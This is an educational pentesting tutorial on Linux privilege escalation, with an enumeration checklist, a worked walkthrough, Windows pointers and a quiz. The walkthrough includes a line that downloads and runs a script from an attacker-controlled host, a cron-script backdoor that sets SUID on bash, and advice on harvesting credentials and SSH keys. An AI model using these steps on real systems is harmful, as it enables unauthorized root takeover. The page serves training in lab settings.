Privilege Escalation ⬆️

The art of going from low-priv user to root.
The second half of every pentest — and usually where the real fun begins.

"Landed as www-data. Leaving as root." 👑
Chapter 01 // Definition

📖 What is privilege escalation?

The process of abusing misconfigurations, weak permissions, or vulnerabilities to gain higher privileges than you were initially given on a system.

📝 Think of it like sneaking into the VIP section

You got into the club as a regular guest (initial access). The bartender pours you the house beer. But you spot a staff-only door someone forgot to lock (misconfig). Now you're backstage with the bands. You notice a manager left the keys to the safe on the counter (bad permissions). Now you're rich. Privesc is a series of small "oh, this shouldn't be accessible to me" moments that add up to total control.

Two flavors

⬆️ Vertical

Low-priv user → root (or admin). You gain MORE rights than you had. The classic "privesc."

↔️ Horizontal

User A → User B at the same privilege level. Different set of access (new files, new services), but not "higher." Useful for pivoting.

the methodology
Chapter 02 // The Linux privesc checklist

🔍 What to check, in order

1️⃣ Kernel version

uname -a. Old kernel? Check exploit-db for a working local exploit. (DirtyCow, DirtyPipe, OverlayFS, etc.)

2️⃣ sudo rights

sudo -l — what can you run as root without a password? Any binary here that can spawn a shell (vi, less, awk, nmap) → game over. Check GTFOBins.

3️⃣ SUID binaries

find / -perm -4000 -type f 2>/dev/null. Any non-standard binaries? Check each one against GTFOBins.

4️⃣ Cron jobs

Cron running scripts as root? Writable by you? Instant escalation. Check /etc/crontab, /etc/cron.d/, and run pspy to catch jobs in action.

5️⃣ Writable /etc/ files

/etc/passwd writable? Add a new root user. /etc/shadow? Crack hashes offline.

6️⃣ Service/config files

systemd unit files with weak perms, Docker socket exposed (/var/run/docker.sock), LD_PRELOAD abuse, Capabilities (getcap).

7️⃣ Interesting files in /home

SSH keys, .bash_history, config files with creds, backup scripts. Low-effort, high-reward.

8️⃣ Running processes

ps aux — services running as root? Custom binaries? Commands with creds visible in args?

🧰 Auto-enumeration: Don't do this by hand every time. Use LinPEAS, linux-smart-enumeration, or LinEnum. Drop on target, run, read the colored output — they flag the juicy stuff in red/yellow.
Chapter 03 // Full example chain

🎯 A realistic privesc walkthrough

You popped a web shell via an SQL injection → dropped to www-data via reverse shell. Now what?

  1. Stabilize the shell. python3 -c 'import pty; pty.spawn("/bin/bash")' + stty raw -echo; fg for a real TTY.
  2. Drop LinPEAS. On your box: python3 -m http.server 8000. On target: wget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh.
  3. Read the red output. LinPEAS highlights: SUID on /usr/bin/find, world-writable cron script at /opt/backup.sh.
  4. Pick the easiest. Cron runs as root. Script is writable. Append chmod +s /bin/bash to the script.
  5. Wait for the cron interval (say 5 minutes).
  6. Bash is now SUID root. Run /bin/bash -p → root shell. 👑
🚨 Lab it, don't read it. This only sinks in when you do it live. TryHackMe has excellent privesc rooms: Linux PrivEsc, Linux PrivEsc Arena, Common Linux Privesc. Run them in this exact order and you'll build the muscle memory.
Chapter 04 // Windows side

🪟 Windows privesc (quick note)

This page focuses on Linux — which is where most bug-bounty and CTF privesc lives. But Windows has its own universe:

  • AlwaysInstallElevated registry setting
  • Unquoted service paths
  • Token impersonation (JuicyPotato, PrintSpoofer, GodPotato)
  • DLL hijacking
  • Stored creds in registry / SAM

Run winPEAS (the Windows cousin of linPEAS) to enumerate. Reference: HackTricks Windows Privesc.

🎯 Quick Check

You run sudo -l and see you can run /usr/bin/vim as root. What's the fastest path to a root shell?
sudo vim /etc/passwd and add a new root user
sudo vim, then :!bash inside vim to spawn a root shell
chmod 4755 /bin/bash as your user
There's no way — vim can't help
